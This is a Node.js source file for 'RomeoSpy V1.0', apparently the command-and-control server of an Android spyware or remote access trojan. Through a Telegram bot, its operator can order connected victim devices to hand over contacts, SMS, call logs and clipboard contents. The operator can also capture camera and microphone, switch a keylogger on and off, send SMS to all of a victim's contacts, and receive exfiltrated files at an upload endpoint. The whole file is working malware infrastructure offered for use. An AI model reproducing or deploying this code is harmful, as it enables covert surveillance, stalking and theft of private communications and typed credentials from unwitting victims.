// 🎯 RomeoSpy V1.0 — by You
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const TelegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer();
const config = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new TelegramBot(config.token, { polling: true });
const sessions = new Map();

// ✨ New UI labels with full-width unicode + emojis
const LABELS = {
  DEVICES: "🔹 ＤＥＶＩＣＥＳ 🛰️",
  ACTIONS: "🔹 ＡＣＴＩＯＮＳ 🛠️",
  TEST_PIC: "🧪 ＴＥＳＴ ＰＩＣ 📂",
  TEST_VID: "🧪 ＴＥＳＴ ＶＩＤ 📂",
  ABOUT: "🔹 ＡＢＯＵＴ 👁️‍🗨️",
  ALL_DEV: "🔹 ＡＬＬ ＤＥＶＩＣＥＳ 🌐",
  BACK: "🔙 ＢＡＣＫ",
};

const ACTIONS = [
  "🎯 ＣＯＮＴＡＣＴＳ 📇",
  "🎯 ＳＭＳ 💬",
  "🎯 ＣＡＬＬＳ 📞",
  "🎯 ＡＰＰＳ 📲",
  "🎯 ＭＡＩＮ ＣＡＭ 📷",
  "🎯 ＳＥＬＦＩＥ ＣＡＭ 🤳",
  "🎯 ＭＩＣ 🎙️",
  "🎯 ＣＬＩＰＢＯＡＲＤ 📋",
  "🎯 ＴＯＡＳＴ 🍞",
  "🎯 ＳＥＮＤ ＳＭＳ 📨",
  "🎯 ＶＩＢＲＡＴＥ 📳",
  "🎯 ＫＥＹＬＯＧ ＯＮ ⌨️✅",
  "🎯 ＫＥＹＬＯＧ ＯＦＦ ⌨️❌",
  "🎯 ＳＭＳ ＡＬＬ ☎️📝",
  "🎯 ＮＯＴＩＦＹ 🔔",
];

// Maps styled label → command key
const mapLabel = {
  ["🎯 ＣＯＮＴＡＣＴＳ 📇"]: "contacts",
  ["🎯 ＳＭＳ 💬"]: "sms",
  ["🎯 ＣＡＬＬＳ 📞"]: "calls",
  ["🎯 ＡＰＰＳ 📲"]: "apps",
  ["🎯 ＭＡＩＮ ＣＡＭ 📷"]: "main-camera",
  ["🎯 ＳＥＬＦＩＥ ＣＡＭ 🤳"]: "selfie-camera",
  ["🎯 ＭＩＣ 🎙️"]: "microphone",
  ["🎯 ＣＬＩＰＢＯＡＲＤ 📋"]: "clipboard",
  ["🎯 ＴＯＡＳＴ 🍞"]: "toast",
  ["🎯 ＳＥＮＤ ＳＭＳ 📨"]: "sendSms",
  ["🎯 ＶＩＢＲＡＴＥ 📳"]: "vibrate",
  ["🎯 ＫＥＹＬＯＧ ＯＮ ⌨️✅"]: "keylogger-on",
  ["🎯 ＫＥＹＬＯＧ ＯＦＦ ⌨️❌"]: "keylogger-off",
  ["🎯 ＳＭＳ ＡＬＬ ☎️📝"]: "smsToAllContacts",
  ["🎯 ＮＯＴＩＦＹ 🔔"]: "popNotification"
};

// Keyboards
const mainMenu = [
  [LABELS.DEVICES, LABELS.ACTIONS],
  [LABELS.TEST_PIC, LABELS.TEST_VID],
  [LABELS.ABOUT],
];

const actionMenu = (devs) => [
  ...devs,
  [LABELS.ALL_DEV],
  [LABELS.BACK],
];

// Helper to process any command
function processAction(chatId, devId, request) {
  bot.sendMessage(chatId, `⚙️  ＰＲＯＣＥＳＳＩＮＧ．．． ＲＥＱＵＥＳＴ 💽`, { parse_mode: "HTML" });
  const payload = { request, extras: [] };
  if (devId === "all") io.emit("commend", payload);
  else io.to(devId).emit("commend", payload);
  setTimeout(() => {
    bot.sendMessage(chatId, `✅  ＣＯＭＰＬＥＴＥＤ！ ＲＥＳＰＯＮＳＥ ＳＥＮＴ 📤`, {
      parse_mode: "HTML",
      reply_markup: { keyboard: mainMenu, resize_keyboard: true }
    });
  }, 600);
}

// Upload endpoint
app.post("/upload", upload.single("file"), (req, res) => {
  bot.sendDocument(config.adminId, {
    source: req.file.buffer,
    filename: req.file.originalname,
    contentType: req.file.mimetype || "application/octet-stream"
  }, {
    caption: `📁 Ｆｉｌｅ ｆｒｏｍ → ${req.headers.model}`,
    parse_mode: "HTML"
  });
  res.send("Done");
});

// Static text endpoint
app.get("/text", (_, res) => res.send(config.text));

// Socket.IO handling
io.on("connection", sock => {
  const m = sock.handshake.headers;
  const meta = { model: m.model || "Unknown", version: m.version || "Unknown", ip: m.ip || "Unknown" };
  sock.meta = meta;
  bot.sendMessage(config.adminId,
    `🛰️  ＤＥＶＩＣＥ ＣＯＮＮＥＣＴＥＤ\nModel: ${meta.model}\nVer: ${meta.version}\nIP: ${meta.ip}`,
    { parse_mode: "HTML" });
  sock.on("disconnect", () => {
    bot.sendMessage(config.adminId,
      `🔒  ＤＥＶＩＣＥ ＤＩＳＣＯＮＮＥＣＴＥＤ\nModel: ${meta.model}`,
      { parse_mode: "HTML" });
  });
  sock.on("message", msg => {
    bot.sendMessage(config.adminId,
      `📩  ＭＳＧ ＦＲＯＭ ${meta.model}\n${msg}`,
      { parse_mode: "HTML" });
  });
});

// Bot command & message handlers
bot.onText(/\/start/, msg => {
  bot.sendMessage(msg.chat.id,
    `🤖  ＷＥＬＣＯＭＥ ＴＯ ＲＯＭＥＯＳＰＹ Ｖ１．０\n🔓  ＦＵＬＬＹ ＵＮＬＯＣＫＥＤ`,
    { reply_markup: { keyboard: mainMenu, resize_keyboard: true }, parse_mode: "HTML" }
  );
});

bot.onText(/\/testpic/, msg => {
  const f = path.join(__dirname, "assets/testpic.jpg");
  bot.sendChatAction(msg.chat.id, "upload_photo");
  bot.sendPhoto(msg.chat.id, fs.createReadStream(f));
});

bot.onText(/\/testvid/, msg => {
  const f = path.join(__dirname, "assets/testvid.mp4");
  bot.sendChatAction(msg.chat.id, "upload_video");
  bot.sendVideo(msg.chat.id, fs.createReadStream(f));
});

bot.on("message", msg => {
  const t = msg.text, chat = msg.chat.id;
  const count = io.sockets.sockets.size;

  if (t === LABELS.DEVICES || t === LABELS.ACTIONS) {
    if (!count) return bot.sendMessage(chat, `⚠️  ＮＯ ＤＥＶＩＣＥＳ ＣＯＮＮＥＣＴＥＤ`, { parse_mode: "HTML" });
    const devs = Array.from(io.sockets.sockets.entries()).map(([id, s]) => [s.meta.model, id]);
    const buttons = devs.map(d => [`🎯 ${d[0]}`]);
    return bot.sendMessage(chat, `🔹  ＳＥＬＥＣＴ ＤＥＶＩＣＥ`, {
      reply_markup: { keyboard: [...buttons, [LABELS.ALL_DEV], [LABELS.BACK]], one_time_keyboard: true },
      parse_mode: "HTML"
    });
  }

  if (t === LABELS.BACK) {
    sessions.delete(chat);
    return bot.sendMessage(chat, `🔹  ＭＡＩＮ ＭＥＮＵ`, {
      reply_markup: { keyboard: mainMenu, resize_keyboard: true }, parse_mode: "HTML"
    });
  }

  const devEntry = Array.from(io.sockets.sockets.entries()).find(([,s]) => t.endsWith(s.meta.model));
  if (devEntry) {
    sessions.set(chat, devEntry[0]);
    return bot.sendMessage(chat, `🎯  ＣＨＯＯＳＥ ＡＣＴＩＯＮ`, {
      reply_markup: { keyboard: ACTIONS.map(a => [a]), one_time_keyboard: true }, parse_mode: "HTML"
    });
  }

  if (t === LABELS.ALL_DEV) {
    sessions.set(chat, "all");
    return bot.sendMessage(chat, `🎯  ＣＨＯＯＳＥ ＡＣＴＩＯＮ ＦＯＲ ＡＬＬ`, {
      reply_markup: { keyboard: ACTIONS.map(a => [a]), one_time_keyboard: true }, parse_mode: "HTML"
    });
  }

  if (ACTIONS.includes(t)) {
    const devId = sessions.get(chat) || "all";
    const key = mapLabel[t];
    if (key) processAction(chat, devId, key);
    else bot.sendMessage(chat, `❌  ＵＮＫＮＯＷＮ ＡＣＴＩＯＮ`, { parse_mode: "HTML" });
    sessions.delete(chat);
  }

  if (t === LABELS.ABOUT) {
    bot.sendMessage(chat,
      `🤖  ＲＯＭＥＯＳＰＹ Ｖ１．０\n👨‍💻  ＣＲＥＡＴＯＲ： ＹＯＵ\n🌐  ＳＴＡＴＵＳ： ＡＣＴＩＶＥ\n🔓  ＰＲＥＭＩＵＭ： ＵＮＬＯＣＫＥＤ`,
      { parse_mode: "HTML" }
    );
  }
});

// Keep-alive & host ping
setInterval(() => io.emit("ping", {}), 5000);
setInterval(() => https.get(config.host).on("error", () => {}), 300000);

server.listen(process.env.PORT || 3000, () => {
  console.log("RomeoSpy V1.0 online 🚀");
});
